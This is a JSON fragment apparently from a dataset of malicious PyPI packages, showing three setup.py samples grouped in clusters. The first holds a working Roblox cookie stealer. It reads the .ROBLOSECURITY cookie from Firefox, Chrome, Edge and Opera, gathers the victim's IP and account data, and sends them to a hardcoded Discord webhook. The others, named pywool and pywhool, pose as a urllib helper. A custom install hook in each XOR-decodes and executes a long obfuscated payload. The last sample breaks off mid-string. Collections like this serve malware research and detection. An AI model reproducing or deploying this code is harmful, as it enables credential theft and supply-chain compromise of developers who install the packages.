        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolozpnyeyhirx', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038476716437405716/AqDCebvTU86kxAgiJ2YycgnQkua2ajAzGgrw-_j0yonuAPLK2HGRg1CoEHOj774ztEyM' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      }
    ]
  },
  {
    "cluster_id": 23,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-13-pywool-v1.0.2",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'A simplified version of urllib.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x04\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kqJlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywool\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)\n\nclass send():\n    pass\n\ndef __init__():\n    pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-17-pywhool-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'A simplified version of urllib.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x04\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kq